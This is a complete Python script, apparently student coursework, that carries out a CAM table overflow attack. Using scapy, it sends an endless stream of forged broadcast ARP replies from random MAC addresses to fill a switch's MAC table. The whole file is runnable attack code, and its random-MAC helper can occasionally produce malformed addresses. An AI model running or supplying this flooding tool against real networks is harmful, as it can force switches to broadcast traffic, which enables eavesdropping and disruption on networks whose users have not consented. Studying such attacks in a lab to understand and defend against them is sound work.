#!/usr/bin/env python3
"""
file:       cam_overflow.py
author:     Chris Tremblay <cst1465@rit.edu>
language:   Python3
date:       2/13/2023, National Clean Your Computer Day
description:
    perform a cam overflow attack
"""

import scapy.all as scapy
from math import ceil
from random import getrandbits
from binascii import b2a_hex

# constants
MAC_ADDR_SIZE  = 6
SWITCH_MEMSIZE = 2000

SRC_IP = "10.0.0.1"
DST_IP = "10.0.0.2"

VERBOSE = False

def get_random_mac() -> str:
    """
    description:
        generate a random mac address
    returns:
        the mac address in string form
    """
    # generate 48 random bits
    rand_bits = '%x' % getrandbits( 48 )

    # place semicolon to deliniate each pair of bytes
    mac = ""
    for i in range( 1, len( rand_bits ), 2 ):
        mac += rand_bits[i-1] + rand_bits[i] + ":"

    # strip off last element and return
    mac = mac[:-1]
    return mac

def send_arp( dst_addr: str, src_addr: str, src_mac: str ):
    """
    description:
        send a malicious arp to make switch CAM table
        start learning bad MAC addrs
    parameters:
        dst_addr -> the destination addr in arp broadcast
        src_addr -> the source addres of arp broadcast
        src_mac  -> the source mac address 
    """
    # create packet
    pkt = scapy.Ether()/scapy.ARP()
    pkt[scapy.ARP].op    = 2
    pkt[scapy.ARP].hwsrc = src_mac
    pkt[scapy.ARP].pdst  = dst_addr
    pkt[scapy.ARP].psrc  = src_addr
    pkt[scapy.Ether].dst = "ff:ff:ff:ff:ff:ff"

    # send
    scapy.sendp( pkt, verbose=VERBOSE )
    return

def main():
    """
    description:
        driver function
    """
    # figure out how many macs to send to take up CAM
    num_macs = ceil( SWITCH_MEMSIZE / MAC_ADDR_SIZE )
    
    # start sending malicious arps
    count = 0
    try:
        while( True ):
            send_arp( DST_IP, SRC_IP, get_random_mac() )
            count += 1
            if( count == num_macs ):
                print( "enough MACS have been learned to overflow switch" )
            
    except KeyboardInterrupt:
        print( "done" )

    return

if( __name__ == "__main__" ):
    main()
